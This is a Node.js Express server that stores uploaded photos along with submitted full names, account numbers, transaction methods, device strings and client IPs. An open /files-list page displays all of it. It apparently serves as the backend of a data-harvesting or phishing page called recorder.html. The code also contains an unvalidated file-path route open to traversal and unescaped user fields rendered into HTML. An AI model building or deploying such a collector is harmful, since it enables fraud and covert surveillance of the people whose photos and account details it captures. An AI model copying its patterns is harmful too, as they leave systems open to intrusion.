const express = require("express");
const multer  = require("multer");
const path    = require("path");
const fs      = require("fs");

const app  = express();
const PORT = process.env.PORT || 10000;

// ---------- Paths & storage ----------
const publicDir  = path.join(__dirname, "public");
const uploadDir  = path.join(__dirname, "uploads");
const logPath    = path.join(__dirname, "uploads-log.json");

// Make sure uploads folder exists
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

// Load previous log (if any)
let uploadsLog = [];
if (fs.existsSync(logPath)) {
  try {
    const raw = fs.readFileSync(logPath, "utf8");
    uploadsLog = JSON.parse(raw);
  } catch (e) {
    console.error("Failed to read uploads-log.json:", e);
    uploadsLog = [];
  }
}

// Multer storage config
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, uploadDir);
  },
  filename: function (req, file, cb) {
    const ext = path.extname(file.originalname) || ".png";
    const name = Date.now() + "-" + Math.random().toString(36).slice(2, 8) + ext;
    cb(null, name);
  }
});

const upload = multer({ storage });

// ---------- Middleware ----------
app.use(express.static(publicDir));
app.use(express.urlencoded({ extended: true }));

// Helper to get client IP (Render behind proxy)
function getClientIp(req) {
  const xff = req.headers["x-forwarded-for"];
  if (xff) {
    return xff.split(",")[0].trim();
  }
  return req.ip || req.connection.remoteAddress || "unknown";
}

// ---------- Routes ----------

// Home can just redirect to the form
app.get("/", (req, res) => {
  res.redirect("/recorder.html");
});

// Handle upload from recorder.js
app.post("/upload-photo", upload.single("photo"), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).send("No file uploaded");
    }

    const ip       = getClientIp(req);
    const fullName = req.body.fullName || "";
    const account  = req.body.accountNumber || "";
    const method   = req.body.transactionMethod || "";
    const device   = req.body.deviceInfo || "unknown";

    const entry = {
      timestamp: new Date().toISOString(),
      ip,
      fullName,
      account,
      method,
      device,
      filename: req.file.filename
    };

    uploadsLog.push(entry);

    // Persist log to disk (ephemeral on Render but survives restarts)
    fs.writeFile(logPath, JSON.stringify(uploadsLog, null, 2), (err) => {
      if (err) {
        console.error("Error writing uploads-log.json:", err);
      }
    });

    res.send("Photo stored as: " + req.file.filename);
  } catch (e) {
    console.error("Upload error:", e);
    res.status(500).send("Server error");
  }
});

// Serve an uploaded file
app.get("/files/:name", (req, res) => {
  const filePath = path.join(uploadDir, req.params.name);

  if (!fs.existsSync(filePath)) {
    return res.status(404).send("File not found");
  }

  res.sendFile(filePath);
});

// List all uploaded files + metadata
app.get("/files-list", (req, res) => {
  let rows = uploadsLog.map(entry => {
    const safeName = String(entry.filename || "");
    const url = "/files/" + encodeURIComponent(safeName);

    return `
      <tr>
        <td>${entry.timestamp || ""}</td>
        <td>${entry.ip || ""}</td>
        <td>${entry.fullName || ""}</td>
        <td>${entry.account || ""}</td>
        <td>${entry.method || ""}</td>
        <td>${entry.device || ""}</td>
        <td><a href="${url}" target="_blank" rel="noopener noreferrer">${safeName}</a></td>
      </tr>
    `;
  }).join("");

  if (!rows) {
    rows = `<tr><td colspan="7">No uploads yet.</td></tr>`;
  }

  const html = `
<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Uploaded Photos</title>
  <style>
    body { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
           padding: 24px; background:#f4f6fb; }
    h1 { margin-top:0; }
    table { border-collapse: collapse; width: 100%; background:#fff; }
    th, td { border:1px solid #ddd; padding:8px; font-size:13px; }
    th { background:#f1f5f9; text-align:left; }
    tr:nth-child(even){background-color:#f9fafb;}
  </style>
</head>
<body>
  <h1>Uploaded Photos</h1>
  <table>
    <thead>
      <tr>
        <th>Timestamp (UTC)</th>
        <th>IP Address</th>
        <th>Full Name</th>
        <th>Account #</th>
        <th>Method</th>
        <th>Device (User-Agent)</th>
        <th>File</th>
      </tr>
    </thead>
    <tbody>
      ${rows}
    </tbody>
  </table>
</body>
</html>
  `;

  res.send(html);
});

// ---------- Start ----------
app.listen(PORT, () => {
  console.log("Server listening on port", PORT);
});
